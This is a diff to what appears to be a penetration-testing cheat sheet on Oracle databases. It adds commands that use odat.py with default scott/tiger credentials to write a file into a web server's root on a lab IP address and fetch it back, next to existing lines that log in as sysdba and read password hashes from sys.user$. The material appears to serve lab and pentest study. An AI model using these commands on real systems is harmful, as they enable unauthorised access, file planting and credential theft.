@@ -361,6 +361,10 @@ sqlplus <username>/<pass>@IP/XE-as-an-instanse as sysdba
 # Oracle RDBMS - Interaction
 > select table_name from all_tables; | > select * from user_role_privs; | > select name, password from sys.user$;
 
+# Oracle RDBMS - File Upload
+echo "Oracle File Upload Test" > testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+curl -X GET http://10.129.204.235/testing.txt
 ```
 ##### IPMI
 ```
